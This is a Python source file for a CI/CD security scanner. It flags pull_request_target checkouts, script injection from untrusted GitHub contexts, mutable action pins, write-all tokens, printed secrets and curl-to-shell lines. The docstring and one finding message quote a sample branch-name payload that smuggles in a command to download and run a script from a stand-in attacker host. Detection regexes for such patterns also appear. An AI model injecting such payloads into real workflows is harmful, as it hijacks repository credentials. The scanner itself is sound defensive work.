"""CI/CD pipeline security.

Worth its own scanner because the failure modes are specific and severe: a
workflow runs with repository credentials, often on input a stranger controls,
and the two facts meet in ways that are easy to miss when reading YAML.

The three that matter most, in order:

1. `pull_request_target` + an explicit checkout of the PR head. The trigger runs
   with a write-scoped token in the *base* repo's context; checking out the fork's
   code and then running it hands that token to the PR author.
2. `${{ github.event.* }}` interpolated into a `run:` block. GitHub substitutes
   the value into the shell script *before* bash sees it, so a branch named
   `a"; curl evil.sh | sh; #` executes.
3. Third-party actions pinned to a mutable tag. `@v3` is a moving pointer; the
   owner - or anyone who compromises them - can repoint it at any commit.
"""

from __future__ import annotations

import os
import re
from typing import Any, Dict, Iterator, List, Optional, Tuple

from ..models import Finding
from ..walker import SourceFile
from .base import ScanContext, Scanner
from .registry import register

WORKFLOW_DIRS = (".github/workflows/", ".gitlab-ci", ".circleci/", ".buildkite/")

UNTRUSTED_CONTEXTS = re.compile(
    r"\$\{\{\s*(github\.event\.(issue\.title|issue\.body|pull_request\.title|pull_request\.body|"
    r"pull_request\.head\.ref|pull_request\.head\.label|comment\.body|review\.body|"
    r"review_comment\.body|head_commit\.message|head_commit\.author\.name|"
    r"head_commit\.author\.email|discussion\.title|discussion\.body)|"
    r"github\.head_ref|github\.ref_name)\s*\}\}"
)

ACTION_USES = re.compile(r"^\s*(?:-\s*)?uses\s*:\s*['\"]?([^'\"\s#]+)['\"]?")
TRUSTED_OWNERS = {"actions", "github", "docker", "aws-actions", "azure", "google-github-actions"}

SECRET_ECHO = re.compile(r"\b(echo|print|printf|cat)\b[^\n]*\$\{\{\s*secrets\.")
CURL_PIPE = re.compile(r"(curl|wget)[^\n|]*\|\s*(sudo\s+)?(bash|sh|zsh|python\d?)")


def _line_of(text: str, offset: int) -> int:
    return text.count("\n", 0, offset) + 1


def _indent(line: str) -> int:
    return len(line) - len(line.lstrip())


def _blocks(lines: List[str], start: int) -> List[Tuple[int, str]]:
    """Lines belonging to the YAML block that starts at `start` (0-indexed)."""
    base = _indent(lines[start])
    out = [(start, lines[start])]
    for index in range(start + 1, len(lines)):
        line = lines[index]
        if line.strip() and _indent(line) <= base:
            break
        out.append((index, line))
    return out


@register
class CicdScanner(Scanner):
    name = "cicd"
    description = "CI/CD workflow security: trigger abuse, script injection, unpinned actions"

    def applies_to(self, source: SourceFile) -> bool:
        path = source.path
        if any(path.startswith(prefix) or f"/{prefix}" in path for prefix in WORKFLOW_DIRS):
            return True
        name = os.path.basename(path).lower()
        return name in {".gitlab-ci.yml", ".travis.yml", "azure-pipelines.yml", "jenkinsfile", "bitbucket-pipelines.yml"}

    def scan_file(self, source: SourceFile, context: ScanContext) -> Iterator[Finding]:
        text = source.read()
        lines = text.splitlines()
        is_github = "/workflows/" in source.path or source.path.startswith(".github/")

        if is_github:
            yield from self._pull_request_target(source, text, lines)
            yield from self._script_injection(source, text, lines)
            yield from self._unpinned_actions(source, lines)
            yield from self._permissions(source, lines)

        yield from self._secret_echo(source, text, lines)
        yield from self._curl_pipe(source, text, lines)

    # -- individual checks ---------------------------------------------------
    def _pull_request_target(self, source: SourceFile, text: str, lines: List[str]) -> Iterator[Finding]:
        if "pull_request_target" not in text:
            return
        trigger_line = next((i + 1 for i, ln in enumerate(lines) if "pull_request_target" in ln), 1)
        checks_out_head = re.search(
            r"ref\s*:\s*\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)\s*\}\}|"
            r"ref\s*:\s*\$\{\{\s*github\.event\.pull_request\.merge_commit_sha",
            text,
        )
        if not checks_out_head:
            return
        yield self.make_finding(
            rule_id="ci.pull-request-target-checkout",
            title="pull_request_target checks out the pull request head",
            source=source,
            line=_line_of(text, checks_out_head.start()),
            snippet=lines[_line_of(text, checks_out_head.start()) - 1],
            severity="critical",
            confidence="high",
            description=(
                "pull_request_target runs in the base repository's context with a token that can "
                "write to the repo and read its secrets. Checking out the pull request head and "
                f"then running anything from it (build, test, lint) executes fork-controlled code "
                f"with those credentials. The trigger is declared on line {trigger_line}."
            ),
            remediation=(
                "Use `pull_request` for anything that runs fork code. If you genuinely need the "
                "elevated token, split it: one workflow runs untrusted code with no secrets and "
                "uploads an artifact, a second consumes the artifact without checking out the fork."
            ),
            cwe=["CWE-829"],
            owasp=["A08:2021 Software and Data Integrity Failures"],
            tags=["ci", "supply-chain"],
            references=["https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"],
            scanner=self.name,
        )

    def _script_injection(self, source: SourceFile, text: str, lines: List[str]) -> Iterator[Finding]:
        run_blocks: List[Tuple[int, List[str]]] = []
        for index, line in enumerate(lines):
            if re.match(r"^\s*(-\s*)?run\s*:", line):
                block = _blocks(lines, index)
                run_blocks.append((index, [content for _, content in block]))
        seen = 0
        for start, block in run_blocks:
            body = "\n".join(block)
            match = UNTRUSTED_CONTEXTS.search(body)
            if not match:
                continue
            offset = body.count("\n", 0, match.start())
            line_no = start + offset + 1
            seen += 1
            yield self.make_finding(
                rule_id="ci.script-injection",
                title="Untrusted workflow context interpolated into a shell script",
                source=source,
                line=line_no,
                snippet=lines[line_no - 1] if line_no <= len(lines) else body[:200],
                severity="critical",
                confidence="high",
                description=(
                    f"`{match.group(0)}` is substituted into the script text before the shell "
                    "parses it. That value is set by whoever opened the issue, comment or pull "
                    "request, so a branch named `a\"; curl attacker.sh | sh; #` runs on the "
                    "runner with the workflow's token."
                ),
                remediation=(
                    "Pass the value through an environment variable and reference it as a shell "
                    "variable:\n"
                    "  env:\n"
                    "    TITLE: ${{ github.event.issue.title }}\n"
                    "  run: echo \"$TITLE\"\n"
                    "The expression is then expanded by the runner into the environment, never "
                    "into the script body."
                ),
                cwe=["CWE-78"],
                owasp=["A03:2021 Injection"],
                tags=["ci", "injection"],
                references=["https://securitylab.github.com/resources/github-actions-untrusted-input/"],
                scanner=self.name,
                salt="" if seen == 1 else str(seen),
            )

    def _unpinned_actions(self, source: SourceFile, lines: List[str]) -> Iterator[Finding]:
        seen = 0
        for index, line in enumerate(lines):
            match = ACTION_USES.match(line)
            if not match:
                continue
            reference = match.group(1)
            if reference.startswith(("./", "docker://")) or "@" not in reference:
                continue
            action, _, ref = reference.partition("@")
            owner = action.split("/")[0].lower()
            if owner in TRUSTED_OWNERS:
                continue
            if re.fullmatch(r"[0-9a-f]{40}", ref):
                continue
            seen += 1
            mutable = "branch" if not ref.startswith("v") else "tag"
            yield self.make_finding(
                rule_id="ci.unpinned-action",
                title=f"Third-party action {action} pinned to a mutable {mutable}",
                source=source,
                line=index + 1,
                snippet=line.strip(),
                severity="medium" if ref.startswith("v") else "high",
                confidence="high",
                description=(
                    f"`{reference}` resolves through a {mutable} that the action's owner can move at "
                    "any time. Every run of this workflow executes whatever that pointer names today, "
                    "with access to the job's token and secrets - this is the exact path used in the "
                    "tj-actions/changed-files compromise."
                ),
                remediation=(
                    f"Pin to a full commit SHA and keep the version in a trailing comment:\n"
                    f"  uses: {action}@<40-char-sha>  # {ref}"
                ),
                cwe=["CWE-829"],
                owasp=["A08:2021 Software and Data Integrity Failures"],
                tags=["ci", "supply-chain"],
                scanner=self.name,
                salt="" if seen == 1 else str(seen),
            )

    def _permissions(self, source: SourceFile, lines: List[str]) -> Iterator[Finding]:
        for index, line in enumerate(lines):
            if re.match(r"^\s*permissions\s*:\s*write-all\s*$", line):
                yield self.make_finding(
                    rule_id="ci.permissions-write-all",
                    title="Workflow token granted write-all",
                    source=source,
                    line=index + 1,
                    snippet=line.strip(),
                    severity="medium",
                    confidence="high",
                    description=(
                        "write-all gives the job's token write access to every scope - contents, "
                        "packages, deployments, actions. Any code that runs in the job inherits it."
                    ),
                    remediation="Declare the minimum scopes the job needs, e.g. `permissions: {contents: read}`.",
                    cwe=["CWE-732"],
                    owasp=["A01:2021 Broken Access Control"],
                    tags=["ci"],
                    scanner=self.name,
                )

    def _secret_echo(self, source: SourceFile, text: str, lines: List[str]) -> Iterator[Finding]:
        for match in SECRET_ECHO.finditer(text):
            line_no = _line_of(text, match.start())
            yield self.make_finding(
                rule_id="ci.secret-printed",
                title="Secret written to the build log",
                source=source,
                line=line_no,
                snippet=lines[line_no - 1].strip() if line_no <= len(lines) else "",
                severity="high",
                confidence="medium",
                description=(
                    "Printing a secret puts it in the job log. GitHub masks values it knows about, "
                    "but the masking is string-matching and is defeated by any transformation - "
                    "base64, a substring, a character inserted."
                ),
                remediation="Remove the debug line. If you need to confirm a secret is set, print its length.",
                cwe=["CWE-532"],
                owasp=["A09:2021 Security Logging and Monitoring Failures"],
                tags=["ci", "secrets"],
                scanner=self.name,
            )

    def _curl_pipe(self, source: SourceFile, text: str, lines: List[str]) -> Iterator[Finding]:
        seen = 0
        for match in CURL_PIPE.finditer(text):
            line_no = _line_of(text, match.start())
            seen += 1
            yield self.make_finding(
                rule_id="ci.curl-pipe-shell",
                title="Pipeline downloads and executes a remote script",
                source=source,
                line=line_no,
                snippet=lines[line_no - 1].strip() if line_no <= len(lines) else "",
                severity="high",
                confidence="high",
                description=(
                    "Whatever that URL serves at build time runs with the job's privileges and "
                    "credentials. There is no signature check and no record of what executed."
                ),
                remediation="Download to a file, verify a pinned checksum or signature, then run it.",
                cwe=["CWE-494"],
                owasp=["A08:2021 Software and Data Integrity Failures"],
                tags=["ci", "supply-chain"],
                scanner=self.name,
                salt="" if seen == 1 else str(seen),
            )
